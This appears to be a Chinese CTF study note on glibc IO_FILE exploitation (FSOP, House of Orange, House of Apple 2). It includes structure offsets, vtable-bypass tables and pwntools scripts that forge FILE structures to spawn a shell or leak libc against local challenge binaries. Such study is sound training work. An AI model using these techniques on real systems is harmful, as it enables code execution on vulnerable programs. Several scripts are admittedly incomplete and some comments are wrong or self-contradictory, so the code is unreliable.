---
category: "IO_FILE"
tags: ["FSOP", "House of Orange", "IO_FILE", "vtable", "_IO_list_all", "House of Apple"]
difficulty: "高级"
---

# IO_FILE利用：FSOP与House of Orange

## 1. 概述

IO_FILE是glibc中实现的C标准库文件流结构。自glibc 2.24起对虚表（vtable）添加检查后，IO_FILE利用经历了多轮攻防演进。在glibc 2.34+移除了`__malloc_hook`/`__free_hook`后，IO_FILE成为现代堆利用的主要终点。

在CTF离线环境下，IO_FILE利用需要对`_IO_FILE`结构体、`_IO_jump_t`虚表、以及FSOP（File Stream Oriented Programming）攻击链有深入理解。

## 2. 核心原理

### 2.1 _IO_FILE结构体

```c
struct _IO_FILE {
    int _flags;           // 0x00: 标志位 (关键: _IO_MAGIC=0xFBAD0000)
    char *_IO_read_ptr;   // 0x08
    char *_IO_read_end;   // 0x10
    char *_IO_read_base;  // 0x18
    char *_IO_write_base; // 0x20
    char *_IO_write_ptr;  // 0x28
    char *_IO_write_end;  // 0x30
    char *_IO_buf_base;   // 0x38
    char *_IO_buf_end;    // 0x40
    char *_IO_save_base;  // 0x48
    char *_IO_backup_base;// 0x50
    char *_IO_save_end;   // 0x58
    struct _IO_marker *_markers; // 0x60
    struct _IO_FILE *_chain;     // 0x68 指向下一个_IO_FILE (链表)
    int _fileno;           // 0x70
    int _flags2;           // 0x74
    _IO_off_t _old_offset; // 0x78
    unsigned short _cur_column; // 0x80
    signed char _vtable_offset; // 0x82
    char _shortbuf[1];     // 0x83
    _IO_lock_t *_lock;     // 0x88
    _IO_off64_t _offset;   // 0x90
    // ... more fields ...
    struct _IO_jump_t *vtable; // 0xD8 虚表指针
};
```

### 2.2 关键利用点

| 字段 | 偏移(64位) | 利用方式 |
|------|-----------|---------|
| _flags | 0x00 | 设置 _IO_MAGIC 绕过检查；设置标志触发特定路径 |
| _IO_write_base | 0x20 | 与 _IO_write_ptr 配合控制写入 |
| _IO_write_ptr | 0x28 | write_ptr - write_base = 写入长度 |
| _IO_buf_base | 0x38 | 配合某些vtable函数实现任意读写 |
| _chain | 0x68 | 链接到伪造的 _IO_FILE |
| _fileno | 0x70 | stdout=1, stderr=2 |
| vtable | 0xD8 | glibc 2.24+ 必须指向合法vtable范围 |

### 2.3 虚表（_IO_jump_t）

```c
struct _IO_jump_t {
    size_t __dummy;       // 0x00
    size_t __dummy2;      // 0x08
    _IO_finish_t __finish;           // 0x10
    _IO_overflow_t __overflow;       // 0x18  <-- 常用攻击点
    _IO_underflow_t __underflow;     // 0x20
    _IO_underflow_t __uflow;         // 0x28
    _IO_pbackfail_t __pbackfail;     // 0x30
    _IO_xsputn_t __xsputn;           // 0x38  <-- puts等调用
    _IO_xsgetn_t __xsgetn;           // 0x40
    _IO_seekoff_t __seekoff;         // 0x48
    _IO_seekpos_t __seekpos;         // 0x50
    _IO_setbuf_t __setbuf;           // 0x58
    _IO_sync_t __sync;               // 0x60
    _IO_doallocate_t __doallocate;   // 0x68
    _IO_read_t __read;               // 0x70
    _IO_write_t __write;             // 0x78
    _IO_seek_t __seek;               // 0x80
    _IO_close_t __close;             // 0x88
    _IO_stat_t __stat;               // 0x90
    _IO_showmanyc_t __showmanyc;     // 0x98
    _IO_imbue_t __imbue;             // 0xA0
};
```

### 2.4 FSOP攻击原理

FSOP核心思想：伪造一个`_IO_FILE`结构体，替换`_IO_list_all`指针，在程序exit/abort或正常IO操作时触发虚表函数调用。

```c
// 调用链 (exit时):
exit() -> __run_exit_handlers() -> _IO_flush_all_lockp()
-> 遍历 _IO_list_all 链表 -> 调用每个 FILE 的 overflow vtable函数

// 调用链 (puts/printf时):
puts() -> _IO_puts() -> _IO_sputn() -> _IO_XSPUTN() -> xsputn vtable
```

## 3. 关键技巧/检测方法

### 3.1 vtable检查绕过一览

| glibc版本 | 检查方式 | 绕过技术 |
|-----------|---------|---------|
| < 2.24 | 无检查 | 直接伪造vtable |
| 2.24-2.34 | vtable必须在`__stop___libc_IO_vtables`~`__start___libc_IO_vtables`范围内 | 使用vtable中合法的函数地址（如`_IO_str_overflow`）；在合法vtable范围内寻找一跳 |
| 2.35+ | vtable检查加强 | House of Apple（借助_IO_wfile_overflow内部调用`_IO_switch_to_wget_mode`） |

### 3.2 伪造FILE检测公式

```python
# 检测能否伪造_IO_FILE
def can_fake_file(file_addr):
    # 检查1: _flags & _IO_MAGIC_MASK == _IO_MAGIC (0xFBAD0000)
    # 检查2: vtable区域检查 (glibc 2.24+)
    # 检查3: _lock必须是一个可写的非NULL指针

    # 简化: 需要满足的条件
    conditions = {
        '_flags与_IO_MAGIC': True,  # 高2字节为0xFBAD
        '_lock可写': True,
        'vtable合法': True,
        '_IO_write_ptr > _IO_write_base': True,  # 如果走overflow路径
    }
    return conditions
```

### 3.3 stdin/stdout/stderr位置

```
libc基址 + offset 即可找到这三个标准流
_IO_2_1_stdin_  -> libc.symbols['_IO_2_1_stdin_']
_IO_2_1_stdout_ -> libc.symbols['_IO_2_1_stdout_']
_IO_2_1_stderr_ -> libc.symbols['_IO_2_1_stderr_']

_IO_list_all  -> libc.symbols['_IO_list_all']
```

## 4. 常见误区与注意事项

1. **_lock指针**：必须是一个可写的内存地址（哪怕是NULL也需可读可写）
2. **wide char路径**：`_IO_wfile_jumps`中的某些虚表函数可能提供更简单的利用路径
3. **_IO_str_overflow**：常被用作vtable内合法跳板
4. **House of Orange**：需要触发`_IO_flush_all_lockp`，通常通过`malloc_printerr`间接实现
5. **modern glibc**：不再能直接覆盖`__malloc_hook`，必须走IO_FILE路线

## 5. 实战示例

### 5.1 House of Orange 完整利用 (glibc 2.23)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
House of Orange (glibc 2.23)
1. 无free函数，通过修改top_chunk触发sysmalloc
2. 旧top_chunk进入unsorted_bin，泄露libc
3. 利用_IO_list_all构造FSOP，getshell
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = process('./house_of_orange')
elf = ELF('./house_of_orange')
libc = ELF('./libc.so.6')  # 题目提供的libc

def add(size, name=''):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'size:', str(size).encode())
    if name:
        p.sendafter(b'name:', name)

def show():
    p.sendlineafter(b'>', b'2')

def edit(size, name):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'size:', str(size).encode())
    p.sendafter(b'name:', name)

# ---- Step 1: 修改top_chunk大小 ----
# 先分配一个chunk，然后溢出修改top_chunk
add(0x10, b'A' * 0x10)
# 溢出改top_chunk size
# top_chunk的size必须是页对齐 (0x1000 的倍数)
# 且不能让新分配的大小触发mmap
payload = b'A' * 0x10 + p64(0) + p64(0xfe1)  # 只需size，prev_size随意
edit(len(payload), payload)

# ---- Step 2: 触发sysmalloc，旧top进入unsorted_bin ----
# 分配比top_chunk大的chunk
add(0xf68, b'B')  # size > 0xfe1 - 0x20, 具体看glibc版本

# 现在旧top在unsorted_bin中
# 但它的fd/bk指向 main_arena

# ---- Step 3: 泄露libc ----
show()
# 读取输出，解析unsorted_bin fd指针
p.recvuntil(b'Name: ')
# 假设程序显示出chunk内容
leak = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leak - 0x3c4b78  # main_arena + 88 的偏移，需调准
log.info(f'libc_base = {hex(libc_base)}')

# ---- Step 4: 构造FSOP ----
# 关键地址
system = libc_base + libc.symbols['system']
io_list_all = libc_base + libc.symbols['_IO_list_all']

# 构造伪造的 _IO_FILE
fake_file = b'/bin/sh\x00'  # _flags (利用宽字符模式绕过某些检查)
fake_file += p64(0x61)       # _IO_read_ptr
fake_file += p64(0)          # _IO_read_end
fake_file += p64(io_list_all - 0x10)  # _IO_read_base (用于unsorted_bin attack)
fake_file += p64(0)          # _IO_write_base
fake_file += p64(1)          # _IO_write_ptr (write_ptr > write_base)
fake_file += p64(0)          # _IO_write_end

# 构造vtable调用（触发overflow时调用system）
# 在glibc 2.23中，vtable可以不检查范围
# overflow = system, 此时rdi指向当前_IO_FILE的地址
# system(" /bin/sh...?") -> 实际rdi是_IO_FILE的地址，而_flags是 "/bin/sh"
# 所以 system(_IO_FILE_addr) == system(" /bin/sh") 
# 不过 "/bin/sh" 后面有4字节的 0x61... 需要处理

# 更精确的做法：让 _IO_file_jumps的 overflow 被触发时，rdi 指向可控数据
# 通过unsorted_bin attack将 io_list_all 覆写为 fake_file 地址

# 简化：直接控制 _IO_write_base 和 _IO_write_ptr 触发 overflow
# 这里展示核心思路，完整利用需要根据具体libc调整

edit(0x200, fake_file)  # 写入fake FILE结构

# ---- Step 5: 触发FSOP ----
# malloc出错时触发 __malloc_printerr -> __libc_message -> abort -> _IO_flush_all_lockp
# 或正常触发 IO 操作

p.interactive()
```

### 5.2 伪造stdout泄露libc

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
通过伪造 stdout 的 _IO_FILE 泄露libc
技术: 修改 stdout->_flags 以扩大输出缓冲区，使程序输出大量内存数据
"""
from pwn import *

context.arch = 'amd64'

p = process('./partial_write')

# 假设存在部分写漏洞（可修改低字节）
# stdout 在libc中的地址已知低12位（相对于libc基址）
# 当我们不知道完整libc基址时，部分覆写 stdout 的 _IO_write_base 低字节

# 目标: 修改 stdout->_IO_write_base 使其指向更低地址
# stdout 就会输出从 write_base 到 write_ptr 之间的数据
# 这些数据中可能包含libc地址

# 通过任意地址写（如fastbin dup）修改 stdout
# 或者通过部分覆写修改 stdout 指针

# 示例：使用tcache任意地址分配修改stdout
def leak_libc_via_stdout():
    """
    修改 stdout 的 _flags 为 0xfbad1800
    修改 _IO_write_base 低字节
    修改 _IO_read_end 低字节
    触发 puts 时输出更多数据
    """
    # 实际利用中
    stdout_addr = 0x7ffff7dce620  # 需要泄漏或已知
    # 伪造 FILE 结构
    fake_flags = 0xfbad1800
    fake_write_base = stdout_addr - 0x100  # 向前偷数据
    fake_read_end = stdout_addr + 0x100

    # 通过任意写修改
    payload = flat([
        p32(fake_flags),        # _flags
        b'\x00' * 4,
        p64(0) * 3,             # read_ptr, read_end, read_base
        p64(fake_write_base),   # _IO_write_base
        # ... 继续修改
    ])
    return payload

p.interactive()
```

### 5.3 modern glibc (2.35+) House of Apple 2

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
House of Apple 2 利用 (glibc 2.35+)
利用 _IO_wfile_overflow 中的 _IO_switch_to_wget_mode 调用
需要控制 FILE 结构体的某些字段
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# House of Apple 2 条件：
# 1. 可以伪造 _IO_FILE 结构
# 2. _flags 设置 _IO_UNBUFFERED 和 _IO_NO_WRITES
# 3. vtable 指向 _IO_wfile_jumps + x (合法范围内偏移)
# 4. 通过 wide_data 控制 _wide_data->_wide_vtable -> __doallocate

# 伪代码路径:
# _IO_flush_all_lockp -> _IO_wfile_overflow -> _IO_switch_to_wget_mode
# -> _IO_WOVERFLOW(fp, WEOF) -> fp->_wide_data->_wide_vtable->__doallocate

# 关键：__doallocate 在 _IO_jump_t 中偏移 0x68 处
# 如果控制_wide_data->_wide_vtable->__doallocate = system
# 且 fp->_flags 开头为 "/bin/sh"

# 需要精确的内存布局
system_addr = 0x7ffff7a31420  # system地址
bin_sh_addr = 0x7ffff7b9d868  # "/bin/sh" 地址

fake_file = flat([
    # _flags = "/bin/sh\x00"但需要满足_IO_file_is_open
    p64(0x2073696874202f),  # ASCII: "/this " (注意字节序)
    # 实际_flags需要同时满足file_is_open和wide char检查
    # 常用: 0x68732f6e69622f (小端: b'/bin/sh\x00')
    # 但这样不满足flags条件...
    # 折衷: 找一个同时是合法flags和指向"/bin/sh"的指针

    p64(0) * 7,  # read ptr, end, base; write base, ptr, end; buf base
    p64(0),      # buf end
    p64(0) * 4,  # save base, backup base, save end, markers
    p64(heap_addr_for_wide_data),  # _chain (或保留原值)
    # ... 继续构造
])

p.interactive()
```

## 6. 相关知识点

- **堆利用进阶**：House系列包括House of Orange，见 05-堆利用进阶.md
- **格式化字符串**：与IO_FILE结合实现泄露+劫持，见 03-格式化字符串漏洞.md
- **glibc源码**：推荐阅读 `libio.h`、`libioP.h`、`genops.c`、`fileops.c`、`wfileops.c`
- **pwntools FileStructure**：`FileStructure()` 可辅助构造伪造的FILE结构
- **FSOP各版本**：glibc 2.23/2.24/2.28/2.31/2.35 的 FSOP 技术不同，离线环境下建议准备各版本的利用链速查表
